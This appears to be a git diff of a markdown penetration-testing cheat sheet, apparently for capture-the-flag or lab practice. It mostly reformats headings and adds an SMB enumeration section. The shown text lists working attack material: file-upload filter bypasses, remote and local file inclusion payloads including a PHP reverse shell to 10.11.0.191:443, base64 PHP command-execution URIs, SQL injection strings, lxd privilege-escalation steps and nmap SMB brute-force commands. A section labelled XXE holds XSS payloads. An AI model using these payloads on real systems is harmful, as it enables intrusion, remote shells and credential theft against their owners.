@@ -1,5 +1,5 @@
 -----------------------------------------------------------------------------------------------------------
-## Useful find commands example
+# Useful find commands example
 
 
 `SUID`
@@ -24,14 +24,8 @@ getcap -r / 2>/dev/null
 cat $(find / -name flag.txt 2>/dev/null)
 ```
 
-
-
-
-
-
-
 -------------------------------------------------------------------------------------------------------------
-## Bypass File Upload Filtering
+# Bypass File Upload Filtering
 
 `GIF89a`
 ```
@@ -51,7 +45,7 @@ mv evil.jpg evil.php.jpg
 
 ------------------------------------------------------------------------------------------------------------
 
-## Remote File Inclusion (RFI)
+# Remote File Inclusion (RFI)
 
 #### Common payloads
 `php:expect://id`
@@ -79,7 +73,7 @@ And evil.txt will look like something like this:
 ```
 <?php echo shell_exec("whoami");?>
 ```
-### Or just get a reverse shell directly like this:
+`Or just get a reverse shell directly like this:`
 ```
 <?php echo system("0<&196;exec 196<>/dev/tcp/10.11.0.191/443; sh <&196 >&196 2>&196"); ?>
 ```
@@ -93,7 +87,7 @@ If it does not work you can also add a ?, this way the rest will be interpreted 
 
 
 -------------------------------------------------------------------------------------------------------------
-## Local file inclusion (LFI) payloads
+# Local file inclusion (LFI) payloads
 
 `../../../../../../etc/passwd`
 
@@ -115,7 +109,7 @@ You can also try to use those insted of `/etc/passwd`
 /var/log/apache2/access.log
 ```
 
-## LFI examples
+# LFI examples
 
 *akech.com/index.php?token=`/etc/passwd%00`*
 
@@ -131,7 +125,7 @@ http://www.test.com.ar/main.php?pagina=data:,<?system($_GET['x']);?>&x=ls
 http://www.test.com.ar/main.php?pagina=data:;base64,PD9zeXN0ZW0oJF9HRVRbJ3gnXSk7Pz4=&x=ls
 ```
 -------------------------------------------------------------------------------------------------------------
-## PHP filters for LFI
+# PHP filters for LFI
 
 ```
 php://filter/convert.base64-encode/resource=
@@ -171,7 +165,7 @@ if(!$con)...
 -------------------------------------------------------------------------------------------------------------
 
 
-## XXE basic payloads
+# XXE basic payloads
 
 ```
 <script>alert('XSS')</script>
@@ -182,7 +176,7 @@ if(!$con)...
 <script src="javascript:alert(1)">
 ```
 -------------------------------------------------------------------------------------------------------
-## SQL injection payload list
+# SQL injection payload list
 `Generic SQL Injection Payloads`
 ```
 '
@@ -205,7 +199,7 @@ if(!$con)...
 ```
 
 -------------------------------------------------------------------------------------------------------
-## lxc/lxd Privilege Escalation
+# lxc/lxd Privilege Escalation
 
 ```
 git clone  https://github.com/saghul/lxd-alpine-builder.git
@@ -243,7 +237,7 @@ lxc exec ignite /bin/sh
 id
 ```
 -------------------------------------------------------------------------------------------------
-## Scecific permission for specific user
+# Scecific permission for specific user
 `no permission`
 ```
 setfacl -m u:username:000 myfolder/myfile
@@ -259,4 +253,103 @@ setfacl -m u:username:r myfolder/myfile
 `read & write permission`
 ```
 setfacl -m u:username:rw myfolder/myfile
+```
+
+--------------------------------------------------------------------------------------------------
+# SMB enumeration
+## smbclient usage
+List shares on a machine using NULL Session
+```
+smbclient -L
+```
+List shares on a machine using a valid username + password
+```
+smbclient -L <target-IP> -U username%password
+```
+Connect to a valid share with username + password
+```
+smbclient //<target>/<share$> -U username%password
+```
+List files on a specific share
+```
+smbclient //<target>/<share$> -c 'ls' password -U username
+```
+List files on a specific share folder inside the share
+```
+smbclient //<target>/<share$> -c 'cd folder; ls' password -U username
+```
+Download a file from a specific share folder
+```
+smbclient //<target>/<share$> -c 'cd folder;get desired_file_name' password -U username
+```
+Copy a file to a specific share folder
+```
+smbclient //<target>/<share$> -c 'put /var/www/my_local_file.txt .\target_folder\target_file.txt' password -U username
+```
+Create a folder in a specific share folder
+```
+smbclient //<target>/<share$> -c 'mkdir .\target_folder\new_folder' password -U username
+```
+Rename a file in a specific share folder
+```
+smbclient //<target>/<share$> -c 'rename current_file.txt new_file.txt' password -U username
+```
+
+## enum4linux usage for smb enumeration
+enum4linux - General enumeration - anonymous session
+```
+enum4linux -a <target>
+```
+enum4linux - General enumeration - authenticated session
+```
+enum4linux -a <target> -u <user> -p <pass>
+```
+enum4linux - Users enumeration
+```
+enum4linux -u <user> -p <pass> -U <target>
+```
+enum4linux - Group and members enumeration
+```
+enum4linux -u <user> -p <pass> -G <target>
+```
+enum4linux - Password policy
+```
+enum4linux -u <user> -p <pass> -P <target>
+```
+## Using nmap for smb enumeration
+nmap - Enum Users
+```
+nmap -p 445 --script smb-enum-users <target> --script-args smbuser=username,smbpass=password,smbdomain=domain nmap -p 445 --script smb-enum-users <target> --script-args smbuser=username,smbhash=LM:NTLM,smbdomain=domain
+```
+```
+nmap --script smb-enum-users.nse --script-args smbusername=User1,smbpass=Pass@1234,smbdomain=workstation -p445 192.168.1.10
+```
+```
+nmap --script smb-enum-users.nse --script-args smbusername=User1,smbhash=aad3b435b51404eeaad3b435b51404ee:C318D62C8B3CA508DD753DDA8CC74028,smbdomain=mydomain -p445 192.168.1.10
+```
+nmap - Enum Groups
+```
+nmap -p 445 --script smb-enum-groups <target> --script-args smbuser=username,smbpass=password,smbdomain=domain nmap -p 445 --script smb-enum-groups <target> --script-args smbuser=username,smbhash=LM:NTLM,smbdomain=domain
+```
+nmap - Enum Shares
+```
+nmap -p 445 --script smb-enum-shares <target> --script-args smbuser=username,smbpass=password,smbdomain=domain nmap -p 445 --script smb-enum-shares <target> --script-args smbuser=username,smbpass=LM:NTLM,smbdomain=domain
+```
+nmap - OS Discovery
+```
+nmap -p 445 --script smb-os-discovery <target>
+```
+nmap - SMB Vulnerabilities on Windows
+```
+nmap -p 445 --script smb-vuln-ms06-025 target-IP
+nmap -p 445 --script smb-vuln-ms07-029 target-IP
+nmap -p 445 --script smb-vuln-ms08-067 target-IP
+nmap -p 445 --script smb-vuln-ms10-054 target-IP
+nmap -p 445 --script smb-vuln-ms10-061 target-IP
+nmap -p 445 --script smb-vuln-ms17-010 target-IP
+```
+Always check for updated list on https://nmap.org/nsedoc/scripts/
+map - Brute Force Accounts (be aware of account lockout!)
+```
+nmap –p 445 --script smb-brute –script-args userdb=user-list.txt,passdb=pass-list.txt target-IP
 ```
